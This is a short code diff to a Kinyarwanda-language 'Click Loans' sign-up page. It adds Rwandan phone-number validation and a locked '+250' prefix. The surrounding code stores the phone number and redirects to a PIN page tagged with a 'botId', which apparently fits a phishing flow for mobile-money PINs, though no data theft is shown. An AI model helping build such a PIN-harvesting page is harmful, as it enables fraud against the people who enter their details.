@@ -70,9 +70,15 @@ button:disabled { background: #ccc; }
         <label>Izina ryuzuye</label>
         <input id="name" placeholder="Izina" required>
 
-        <label>Numero ya telefoni</label>
-        <input id="phone"  required>
-
+      <label>Numero ya telefoni</label>
+<input
+    type="tel"
+    id="phone"
+    placeholder="+250788123456"
+    value="+250"
+    pattern="^\+2507[2389][0-9]{7}$"
+    required
+>
         <label class="checkbox-label">
             <input type="checkbox" id="confirmCheck">
             Njemera amategeko na serivisi za Click Loans
@@ -108,6 +114,21 @@ document.getElementById('detailsForm').addEventListener('submit', e => {
     localStorage.setItem('phone', phoneInput.value);
 
     window.location.href = `pin.html?botId=${botId}`;
+});
+
+const phoneInput = document.getElementById("phone");
+
+phoneInput.addEventListener("input", function () {
+    if (!this.value.startsWith("+250")) {
+        this.value = "+250";
+    }
+});
+
+phoneInput.addEventListener("keydown", function (e) {
+    if (this.selectionStart <= 4 &&
+        (e.key === "Backspace" || e.key === "Delete")) {
+        e.preventDefault();
+    }
 });
 </script>
 
